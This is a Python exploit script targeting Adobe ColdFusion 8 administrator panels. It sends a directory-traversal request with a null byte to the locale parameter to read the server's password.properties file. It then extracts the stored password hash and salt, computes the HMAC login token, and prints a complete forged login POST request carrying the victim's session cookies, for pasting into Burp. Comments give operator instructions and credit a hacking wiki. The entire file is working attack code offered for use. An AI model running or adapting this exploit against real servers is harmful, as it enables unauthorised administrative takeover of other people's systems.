#!/usr/bin/python
# resource: https://nets.ec/Coldfusion_hacking
# Intercept a request in burp after you get this chooching.
# Get ready to copy and paste the output of this in.
# Hard to do it programatically b/c of iframe requirements.
# You have about 30 seconds, shouldn't be too hard.
# Disable intercept when you get response.
# Might have to alter the LFI file depending on coldfusion version.
import requests, re, hmac, hashlib, sys, socket

if len(sys.argv) != 2:
	print("Usage: {} http://example.com".format(sys.argv[0]))
	sys.exit()

host = sys.argv[1]
r = requests.get("{}/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en".format(host)) 
result = r.content.decode(errors='ignore')
password = re.findall('\r\npassword=(.*)\r\n', result)[0]
salt = re.findall('input name="salt" type="hidden" value="(.*)">', result)[0]
hmac_pw = hmac.new(salt.encode(), password.encode(),hashlib.sha1).hexdigest().upper()
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((socket.gethostname(), 1337))
sock.listen(1)
content = 'cfadminPassword={hmac_pw}&requestedURL=%2FCFIDE%2Fadministrator%2Fenter.cfm%3F&salt={salt}&submit=Login'.format(hmac_pw = hmac_pw, salt = salt)
output = '''POST /CFIDE/administrator/enter.cfm HTTP/1.1
Host: {host}
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: {host}
Cookie: CFID={cfid}; CFTOKEN={cftoken}
Connection: keep-alive
Content-Length: {length}
Content-Type: application/x-www-form-urlencoded

{content}'''.format(host=host.replace('http://',''), cfid=r.cookies['CFID'], cftoken = r.cookies['CFTOKEN'], salt = salt, length = len(content), content = content)
print(output)
